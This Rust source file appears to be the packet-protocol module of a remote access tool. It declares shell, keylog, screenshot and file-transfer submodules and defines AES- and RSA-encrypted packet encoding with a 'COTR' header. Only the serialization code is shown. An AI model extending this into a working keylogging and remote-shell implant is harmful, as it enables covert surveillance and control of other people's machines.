pub mod aes;
pub mod filetransfer;
pub mod rsa;
pub mod listdir;
pub mod shell;
pub mod screenshot;
pub mod keylog;

use serde::{Deserialize, Serialize};
use std::any::Any;
use std::fmt::Debug;
use bincode::config::{Configuration, Fixint, LittleEndian};
use crate::network::crypt;

#[derive(Debug, Copy, Clone, Serialize, Deserialize)]
pub enum PacketEncryption{
    Plain,
    AES,
    RSA
}

#[derive(Debug, Copy, Clone, Serialize, Deserialize)]
pub struct PacketHeader {
    pub size: u32,
    pub magic: [u8; 4],
    pub version: u8,
    pub encryption: PacketEncryption,
}

impl PacketHeader {
    pub fn new(size: u32, encryption: PacketEncryption) -> Self {
        Self {
            size,
            magic: [0x43, 0x4F, 0x54, 0x52], // "COTR"
            version: 1,
            encryption,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkPacket {
    pub header: PacketHeader,
    pub data: Vec<u8>,
}
#[typetag::serde(tag = "type")]
pub trait AnyPacketData: Any + Send + Sync + Debug {
    fn as_any(&self) -> &dyn Any;
}

const fn bincode_config() -> Configuration<LittleEndian, Fixint> {
    bincode::config::standard()
        .with_little_endian()
        .with_fixed_int_encoding()
}
#[derive(Serialize, Deserialize)]
pub struct PacketData(Box<dyn AnyPacketData>);

impl From<Box<dyn AnyPacketData>> for PacketData {
    fn from(value: Box<dyn AnyPacketData>) -> Self {
        PacketData(value)
    }
}

impl From<PacketData> for Box<dyn AnyPacketData> {
    fn from(packet_data: PacketData) -> Self {
        packet_data.0
    }
}

impl PacketData {
    pub fn encode(&self) -> Result<Vec<u8>, bincode::error::EncodeError> {
        bincode::serde::encode_to_vec(self, bincode_config())
    }

    pub fn plain_encode(&self) -> Result<NetworkPacket, bincode::error::EncodeError> {
        let data = self.encode()?;
        let header = PacketHeader::new(data.len() as u32, PacketEncryption::Plain);
        Ok(NetworkPacket {
            header,
            data,
        })
    }

    pub fn aes_encode(&self, aeskey: &crypt::aes::AESKey) -> Result<NetworkPacket, &'static str> {
        let encoded_data = self.encode().map_err(|_| "Failed to encode packet")?;
        let encrypted_data = aeskey.encrypt(&encoded_data).map_err(|_| "Encryption failed")?;
        let header = PacketHeader::new(encrypted_data.data().len() as u32, PacketEncryption::AES);
        Ok(NetworkPacket {
            header,
            data: encrypted_data.into(),
        })
    }

    pub fn rsa_encode(&self, rsakey: &crypt::rsa::RSAPublicKey) -> Result<NetworkPacket, String> {
        let encoded_data = self.encode().map_err(|_| "Failed to encode packet")?;
        let encrypted_data = rsakey.encrypt(&encoded_data).map_err(|_| "Encryption failed")?;
        let header = PacketHeader::new(encrypted_data.len() as u32, PacketEncryption::RSA);
        Ok(NetworkPacket {
            header,
            data: encrypted_data,
        })
    }

    pub fn decode(data: &[u8]) -> Result<Self, String> {
        let (data, _size) = bincode::serde::decode_from_slice(data, bincode_config())
            .map_err(|_| "Failed to decode packet".to_string())?;
        data
    }

    pub fn aes_decode(
        data: impl Into<crypt::aes::AESEncodedData>,
        aes_key: &crypt::aes::AESKey,
    ) -> Result<Self, String> {
        let decoded_data = aes_key.decrypt(data.into()).map_err(|_| "Decryption failed")?;
        Self::decode(&decoded_data)
    }

    pub fn rsa_decode(
        data: Vec<u8>,
        private_key: &crypt::rsa::RSAPrivateKey,
    ) -> Result<Self, String> {
        let decoded_data = private_key.decrypt(&data).map_err(|_| "Decryption failed")?;
        Self::decode(&decoded_data)
    }
}
